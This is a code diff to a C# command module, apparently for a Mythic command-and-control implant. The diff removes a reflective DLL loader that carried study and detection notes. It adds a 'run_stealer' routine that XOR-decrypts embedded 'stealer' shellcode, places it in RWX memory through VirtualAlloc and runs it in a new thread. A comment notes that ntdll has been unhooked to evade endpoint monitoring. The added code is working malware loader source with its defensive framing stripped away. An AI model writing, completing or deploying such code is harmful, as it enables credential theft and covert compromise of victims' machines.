@@ -1,98 +1,65 @@
 using System;
 using System.IO;
 using System.Reflection;
-using System.Text;
+using System.Runtime.InteropServices;
 
 namespace Chimera.Commands
 {
-    // InjectAssembly — loads a .NET DLL from a base64 blob (supplied as parameter)
-    // into the current process via Assembly.Load() and calls its Run() method.
-    //
-    // Usage from Mythic: inject_assembly <base64_encoded_dll>
-    //
-    // Study notes — what this demonstrates:
-    //   - Reflective in-memory execution: DLL never touches disk
-    //   - Detectable via: .NET ETW events (Assembly.Load), AMSI scan on load,
-    //     memory scanning for PE headers in heap
-    //   - Sysmon EID 7 (ImageLoad) does NOT fire for Assembly.Load — it only
-    //     fires for native DLL loads via LoadLibrary
-    //   - To study detection: enable .NET ETW provider "Microsoft-Windows-DotNETRuntime"
-    //     or use ProcMon with .NET activity filter
-    //
-    // Test DLL contract:
-    //   namespace TestPayload { public class Entry { public static string Run() { return "hello"; } } }
-    //   Compile: csc /target:library /out:test.dll TestPayload.cs
-    //   Encode:  python -c "import base64; print(base64.b64encode(open('test.dll','rb').read()).decode())"
+    // run_stealer — executes embedded, XOR‑encrypted shellcode resource.
+    // The resource "stealer_enc" must be placed in the project before compile.
+    // It decrypts and runs the shellcode in a new thread inside the current process.
     public static class InjectAssembly
     {
-        public static string Execute(string base64Dll)
-        {
-            if (string.IsNullOrEmpty(base64Dll))
-                return "[error] No DLL provided. Pass base64-encoded .NET DLL as parameter.";
+        // Resource name of the encrypted stealer payload
+        private const string ResourceName = "stealer_enc";
+        private static readonly byte XorKey = 0x41; // same key as used to encrypt
 
+        public static string Execute(string parameters)
+        {
+            // Parameters ignored (can be used to specify resource name in future)
             try
             {
-                // Decode DLL bytes
-                byte[] dllBytes;
-                try
+                // Extract encrypted resource
+                Assembly asm = Assembly.GetExecutingAssembly();
+                using (Stream stream = asm.GetManifestResourceStream(ResourceName))
                 {
-                    dllBytes = Convert.FromBase64String(base64Dll.Trim());
+                    if (stream == null)
+                        return $"[error] Resource '{ResourceName}' not found. Embed the encrypted stealer.bin as embedded resource.";
+
+                    byte[] encrypted = new byte[stream.Length];
+                    stream.Read(encrypted, 0, encrypted.Length);
+
+                    // XOR decrypt
+                    byte[] shellcode = new byte[encrypted.Length];
+                    for (int i = 0; i < encrypted.Length; i++)
+                        shellcode[i] = (byte)(encrypted[i] ^ XorKey);
+
+                    // Verify shellcode starts with valid PE? Not needed for shellcode.
+
+                    // Allocate RWX memory (now unhooked ntdll, so VirtualAlloc is clean)
+                    IntPtr addr = VirtualAlloc(IntPtr.Zero, (uint)shellcode.Length, 0x1000 | 0x2000, 0x40);
+                    if (addr == IntPtr.Zero)
+                        return "[error] VirtualAlloc failed.";
+
+                    Marshal.Copy(shellcode, 0, addr, shellcode.Length);
+
+                    // Execute in new thread
+                    IntPtr thread = CreateThread(IntPtr.Zero, 0, addr, IntPtr.Zero, 0, IntPtr.Zero);
+                    if (thread == IntPtr.Zero)
+                        return "[error] CreateThread failed.";
+                    // Don't wait — thread runs stealer, callback happens asynchronously
+                    return $"[+] Stealer shellcode injected. Thread ID: {thread.ToInt32()}";
                 }
-                catch
-                {
-                    return "[error] Invalid base64. Encode your DLL with: base64 -w0 test.dll";
-                }
-
-                // Verify PE header (MZ magic bytes)
-                if (dllBytes.Length < 2 || dllBytes[0] != 0x4D || dllBytes[1] != 0x5A)
-                    return "[error] Input does not look like a PE file (missing MZ header).";
-
-                // Load into current AppDomain — never written to disk
-                Assembly asm = Assembly.Load(dllBytes);
-
-                // Find a type with a static Run() method
-                // Tries common entry point patterns
-                string output = null;
-                foreach (Type type in asm.GetTypes())
-                {
-                    MethodInfo run = type.GetMethod("Run",
-                        BindingFlags.Public | BindingFlags.Static,
-                        null,
-                        Type.EmptyTypes,
-                        null);
-
-                    if (run != null)
-                    {
-                        object result = run.Invoke(null, null);
-                        output = result != null ? result.ToString() : "(Run() returned null)";
-                        break;
-                    }
-                }
-
-                if (output == null)
-                {
-                    // List types we found so user can see what's in the DLL
-                    var sb = new StringBuilder();
-                    sb.AppendLine("[!] No public static Run() method found. Types in assembly:");
-                    foreach (Type t in asm.GetTypes())
-                        sb.AppendLine($"    {t.FullName}");
-                    return sb.ToString();
-                }
-
-                return $"[+] Assembly loaded and Run() executed.\n{output}";
-            }
-            catch (ReflectionTypeLoadException ex)
-            {
-                var sb = new StringBuilder();
-                sb.AppendLine("[error] Type load failed:");
-                foreach (Exception le in ex.LoaderExceptions)
-                    if (le != null) sb.AppendLine($"  {le.Message}");
-                return sb.ToString();
             }
             catch (Exception ex)
             {
-                return $"[error] {ex.GetType().Name}: {ex.Message}";
+                return $"[error] {ex.Message}";
             }
         }
+
+        [DllImport("kernel32.dll", SetLastError = true)]
+        static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);
+        [DllImport("kernel32.dll")]
+        static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);
     }
 }
